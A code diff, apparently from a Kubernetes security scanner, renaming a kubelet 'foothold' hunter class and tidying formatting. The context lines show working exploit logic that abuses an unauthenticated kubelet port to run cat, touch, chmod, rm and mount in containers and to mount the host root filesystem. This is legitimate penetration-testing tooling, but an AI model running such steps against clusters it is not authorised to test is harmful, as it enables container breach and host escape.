@@ -456,7 +456,7 @@ class SecureKubeletPortHunter(Hunter):
 
 
 @handler.subscribe(AnonymousAuthEnabled)
-class FootholdViaSecureKubeletPort(ActiveHunter):
+class ProveAnonymousAuth(ActiveHunter):
     """Foothold Via Secure Kubelet Port
     Attempts to demonstrate that a malicious actor can establish foothold into the cluster via a
     container abusing the configuration of the kubelet's secure port: authentication-auth=false.
@@ -500,9 +500,7 @@ class FootholdViaSecureKubeletPort(ActiveHunter):
 
     @staticmethod
     def has_no_error_nor_exception(result):
-        return FootholdViaSecureKubeletPort.has_no_error(result) and FootholdViaSecureKubeletPort.has_no_exception(
-            result
-        )
+        return ProveAnonymousAuth.has_no_error(result) and ProveAnonymousAuth.has_no_exception(result)
 
     def cat_command(self, run_request_url, full_file_path):
         return self.post_request(run_request_url, {"cmd": "cat {}".format(full_file_path)})
@@ -578,10 +576,7 @@ class FootholdViaSecureKubeletPort(ActiveHunter):
                             )
 
             if temp_message:
-                message = (
-                    "The following containers have been successfully breached."
-                    + temp_message
-                )
+                message = "The following containers have been successfully breached." + temp_message
 
                 self.event.evidence = "{}".format(message)
 
@@ -658,7 +653,7 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
     def check_file_exists(self, run_request_url, file):
         file_exists = self.ls_command(run_request_url=run_request_url, file_or_directory=file)
 
-        return FootholdViaSecureKubeletPort.has_no_error_nor_exception(file_exists)
+        return ProveAnonymousAuth.has_no_error_nor_exception(file_exists)
 
     def rm_command(self, run_request_url, file_to_remove, number_of_rm_attempts, seconds_to_wait_for_os_command):
         if self.check_file_exists(run_request_url, file_to_remove):
@@ -670,7 +665,7 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
                 if seconds_to_wait_for_os_command:
                     time.sleep(seconds_to_wait_for_os_command)
 
-                first_check = FootholdViaSecureKubeletPort.has_no_error_nor_exception(command_execution_outcome)
+                first_check = ProveAnonymousAuth.has_no_error_nor_exception(command_execution_outcome)
                 second_check = self.check_file_exists(run_request_url, file_to_remove)
 
                 if first_check and not second_check:
@@ -696,10 +691,10 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
 
         file_created = self.touch_command(run_request_url, file_name_with_path)
 
-        if FootholdViaSecureKubeletPort.has_no_error_nor_exception(file_created):
+        if ProveAnonymousAuth.has_no_error_nor_exception(file_created):
             permissions_changed = self.chmod_command(run_request_url, "755", file_name_with_path)
 
-            if FootholdViaSecureKubeletPort.has_no_error_nor_exception(permissions_changed):
+            if ProveAnonymousAuth.has_no_error_nor_exception(permissions_changed):
                 return {"result": True, "file_created": file_name}
 
             self.rm_command(run_request_url, file_name_with_path, number_of_rm_attempts, seconds_to_wait_for_os_command)
@@ -709,7 +704,7 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
     def check_directory_exists(self, run_request_url, directory):
         directory_exists = self.ls_command(run_request_url=run_request_url, file_or_directory=directory)
 
-        return FootholdViaSecureKubeletPort.has_no_error_nor_exception(directory_exists)
+        return ProveAnonymousAuth.has_no_error_nor_exception(directory_exists)
 
     def rmdir_command(
         self, run_request_url, directory_to_remove, number_of_rmdir_attempts, seconds_to_wait_for_os_command,
@@ -723,7 +718,7 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
                 if seconds_to_wait_for_os_command:
                     time.sleep(seconds_to_wait_for_os_command)
 
-                first_check = FootholdViaSecureKubeletPort.has_no_error_nor_exception(command_execution_outcome)
+                first_check = ProveAnonymousAuth.has_no_error_nor_exception(command_execution_outcome)
                 second_check = self.check_directory_exists(run_request_url, directory_to_remove)
 
                 if first_check and not second_check:
@@ -758,7 +753,7 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
                 if seconds_to_wait_for_os_command:
                     time.sleep(seconds_to_wait_for_os_command)
 
-                first_check = FootholdViaSecureKubeletPort.has_no_error_nor_exception(command_execution_outcome)
+                first_check = ProveAnonymousAuth.has_no_error_nor_exception(command_execution_outcome)
                 second_check = self.ls_command(run_request_url, directory) != current_files_and_directories
 
                 if first_check and second_check:
@@ -816,7 +811,7 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
         # /proc/cmdline - This file shows the parameters passed to the kernel at the time it is started.
         command_line = self.cat_command(run_request_url, "/proc/cmdline")
 
-        if FootholdViaSecureKubeletPort.has_no_error_nor_exception(command_line):
+        if ProveAnonymousAuth.has_no_error_nor_exception(command_line):
             if len(command_line.split(" ")) > 0:
                 root_value, root_value_type = self.get_root_values(command_line)
 
@@ -827,24 +822,22 @@ class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
                     else:
                         file_system_or_partition = root_value
 
-                    if FootholdViaSecureKubeletPort.has_no_error_nor_exception(file_system_or_partition):
+                    if ProveAnonymousAuth.has_no_error_nor_exception(file_system_or_partition):
                         directory_created = self.mkdir_command(run_request_url, directory_to_create)
 
-                        if FootholdViaSecureKubeletPort.has_no_error_nor_exception(directory_created):
+                        if ProveAnonymousAuth.has_no_error_nor_exception(directory_created):
                             directory_created = directory_to_create
 
                             mounted_file_system_or_partition = self.mount_command(
                                 run_request_url, file_system_or_partition, directory_created
                             )
 
-                            if FootholdViaSecureKubeletPort.has_no_error_nor_exception(
-                                mounted_file_system_or_partition
-                            ):
+                            if ProveAnonymousAuth.has_no_error_nor_exception(mounted_file_system_or_partition):
                                 host_name = self.cat_command(
                                     run_request_url, "{}/etc/hostname".format(directory_created)
                                 )
 
-                                if FootholdViaSecureKubeletPort.has_no_error_nor_exception(host_name):
+                                if ProveAnonymousAuth.has_no_error_nor_exception(host_name):
                                     return {
                                         "result": True,
                                         "file_system_or_partition": file_system_or_partition,
